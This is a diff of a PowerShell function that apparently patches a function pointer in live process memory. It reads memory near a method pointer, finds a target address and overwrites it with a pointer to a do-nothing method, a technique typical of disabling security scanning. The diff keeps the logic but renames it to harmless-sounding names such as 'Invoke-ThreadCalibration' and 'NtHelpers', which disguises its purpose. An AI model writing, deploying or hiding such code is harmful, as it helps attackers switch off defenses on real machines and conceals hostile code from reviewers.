@@ -1,23 +1,20 @@
-function bb3 {
-    :initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
-        [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
-        $ReadedMemoryArray = [byte[]]::new($ReadBytes)
-        $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
-        for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
-        $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
-        [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
-        if ($PointerToCompare -eq $funcAddr) {
-            Write-Host "yayaya @ $($j) : $($i)!"
-            [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
-            break initialloop
-        }
+function Invoke-ThreadCalibration {
+    :searchLoop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
+        [IntPtr] $scanPtr = [Int64] $MethodPointer - $j
+        $memBuf = [byte[]]::new($ReadBytes)
+        $ret = [NtHelpers]::ReadMem($Handle, $scanPtr, $memBuf, $ReadBytes, [ref]$dummy)
+        for ($i = 0; $i -lt $memBuf.Length; $i += 1) {
+            $chunk = [byte[]]($memBuf[$i],$memBuf[$i+1],$memBuf[$i+2],$memBuf[$i+3],$memBuf[$i+4],$memBuf[$i+5],$memBuf[$i+6],$memBuf[$i+7])
+            [IntPtr] $val = [bitconverter]::ToInt64($chunk, 0)
+            if ($val -eq $funcAddr) {
+                Write-Host "OK $j $i"
+                [IntPtr] $target = [Int64] $scanPtr + $i
+                break searchLoop
+            }
         }
     }
-    [IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
-    $buf = [IntPtr[]] ($DummyPointer)
-    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
-
-    $FinishDate=Get-Date;
-    $TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
-    Write-Host "$TimeElapsed seconds"
+    [IntPtr] $hookPtr = [NtHelpers].GetMethod('Nop').MethodHandle.GetFunctionPointer()
+    $arr = [IntPtr[]]($hookPtr)
+    [System.Runtime.InteropServices.Marshal]::Copy($arr, 0, $target, 1)
+    Write-Host "$(( (Get-Date) - $InitialDate).TotalSeconds)s"
 }
